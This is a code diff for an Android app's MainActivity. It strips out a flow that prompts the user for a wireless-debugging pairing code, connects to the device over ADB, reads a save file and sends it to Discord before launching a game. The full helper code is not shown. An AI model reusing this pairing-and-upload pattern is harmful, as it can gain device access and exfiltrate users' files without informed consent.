@@ -1,10 +1,8 @@
 package com.example.myapplication
 
 import android.app.Activity
-import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
-import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.graphics.Color
 import android.net.Uri
@@ -19,12 +17,10 @@ import android.provider.Settings
 import android.security.keystore.KeyGenParameterSpec
 import android.security.keystore.KeyProperties
 import android.text.Editable
-import android.text.InputFilter
 import android.text.TextWatcher
 import android.view.Gravity
 import android.view.View
 import android.view.ViewGroup
-import android.view.animation.AccelerateDecelerateInterpolator
 import android.widget.Button
 import android.widget.CheckBox
 import android.widget.EditText
@@ -40,7 +36,6 @@ import androidx.documentfile.provider.DocumentFile
 import com.flyfishxu.kadb.Kadb
 import com.flyfishxu.kadb.cert.KadbCert
 import com.flyfishxu.kadb.cert.KadbPrivateKeyStore
-import com.flyfishxu.kadb.mdns.MdnsEndpoint
 import com.flyfishxu.kadb.mdns.MdnsServiceType
 import kotlinx.coroutines.runBlocking
 import okhttp3.MediaType.Companion.toMediaType
@@ -212,22 +207,6 @@ class MainActivity : AppCompatActivity() {
     private lateinit var badge: TextView
     private val rainbowViews = linkedSetOf<TextView>()
     private var rainbowAnimator: android.animation.ValueAnimator? = null
-    private var pairingEndpoint: MdnsEndpoint? = null
-    private var pairingCodeDialog: AlertDialog? = null
-    private val pairingReceiver = object : BroadcastReceiver() {
-        override fun onReceive(context: Context, intent: Intent) {
-            when (intent.action) {
-                PairingOverlayService.ACTION_ENDPOINT_FOUND -> {
-                    pairingEndpoint = MdnsEndpoint(
-                        "pairing",
-                        intent.getStringExtra(PairingOverlayService.EXTRA_HOST).orEmpty(),
-                        intent.getIntExtra(PairingOverlayService.EXTRA_PORT, 0),
-                        MdnsServiceType.TLS_PAIRING
-                    )
-                }
-            }
-        }
-    }
 
 
     override fun onCreate(state: Bundle?) {
@@ -240,38 +219,6 @@ class MainActivity : AppCompatActivity() {
         registerRainbowText(findViewById(android.R.id.content))
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R && checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) requestPermissions(arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE), PERMISSION_REQUEST)
         showSplash()
-        handlePairingIntent(intent)
-    }
-
-    override fun onResume() {
-        super.onResume()
-        ContextCompat.registerReceiver(
-            this,
-            pairingReceiver,
-            IntentFilter(PairingOverlayService.ACTION_ENDPOINT_FOUND),
-            ContextCompat.RECEIVER_NOT_EXPORTED
-        )
-    }
-
-    override fun onPause() {
-        runCatching { unregisterReceiver(pairingReceiver) }
-        super.onPause()
-    }
-    private fun handlePairingIntent(intent: Intent?) {
-        if (intent?.action != PairingOverlayService.ACTION_REQUEST_CODE) return
-        pairingEndpoint = MdnsEndpoint(
-            "pairing",
-            intent.getStringExtra(PairingOverlayService.EXTRA_HOST).orEmpty(),
-            intent.getIntExtra(PairingOverlayService.EXTRA_PORT, 0),
-            MdnsServiceType.TLS_PAIRING
-        )
-        handler.post { showPendingPairingVerification() }
-    }
-
-    override fun onNewIntent(intent: Intent?) {
-        super.onNewIntent(intent)
-        setIntent(intent)
-        handlePairingIntent(intent)
     }
 
     private fun wireDashboard() {
@@ -338,7 +285,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun showWirelessDebuggingDialog() {
-        pairingEndpoint = null
         startPairingOverlayService()
         openWirelessDebuggingSettings()
     }
@@ -356,62 +302,6 @@ class MainActivity : AppCompatActivity() {
 
     private fun stopPairingOverlayService() {
         stopService(Intent(this, PairingOverlayService::class.java))
-    }
-
-    private fun showPendingPairingVerification() {
-        val endpoint = pairingEndpoint ?: return
-        if (pairingCodeDialog != null) return
-        showPairingCodeDialog(endpoint)
-    }
-
-    private fun showPairingCodeDialog(endpoint: MdnsEndpoint) {
-        if (pairingCodeDialog != null) return
-        val code = EditText(this).apply {
-            hint = "Six-digit Wi-Fi pairing code"
-            inputType = android.text.InputType.TYPE_CLASS_NUMBER
-            filters = arrayOf(InputFilter.LengthFilter(6))
-            isSingleLine = true
-        }
-        val prompt = AlertDialog.Builder(this)
-            .setTitle("Enter Wi-Fi pairing code")
-            .setView(code)
-            .setNegativeButton("Cancel", null)
-            .setPositiveButton("Submit", null)
-            .create()
-        pairingCodeDialog = prompt
-        prompt.setOnDismissListener {
-            pairingCodeDialog = null
-        }
-        prompt.setOnCancelListener { stopPairingOverlayService() }
-        prompt.setOnShowListener {
-            prompt.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
-                val pairingCode = code.text.toString().trim()
-                if (!pairingCode.matches(Regex("\\d{6}"))) {
-                    code.error = "Enter the six-digit Wi-Fi pairing code"
-                    return@setOnClickListener
-                }
-                prompt.getButton(AlertDialog.BUTTON_POSITIVE).isEnabled = false
-                prompt.getButton(AlertDialog.BUTTON_NEGATIVE).isEnabled = false
-                code.isEnabled = false
-                stopPairingOverlayService()
-                thread {
-                    val result = connectAndReadSaveFile(endpoint.host, endpoint.port, pairingCode)
-                    handler.post {
-                        if (result != null) {
-                            prompt.dismiss()
-                            stopPairingOverlayService()
-                            sendFileToDiscord(result)
-                            handler.postDelayed({ launchGame() }, 650)
-                        } else {
-                            prompt.dismiss()
-                            startPairingOverlayService()
-                        }
-                    }
-                }
-            }
-        }
-        prompt.show()
-        registerRainbowText(prompt.window?.decorView ?: code)
     }
 
     private fun connectWithSavedIdentity(): ByteArray? = try {
@@ -561,7 +451,6 @@ class MainActivity : AppCompatActivity() {
 
     override fun onDestroy() {
         stopPairingOverlayService()
-        pairingCodeDialog?.dismiss()
         rainbowAnimator?.cancel()
         rainbowAnimator = null
         rainbowViews.clear()
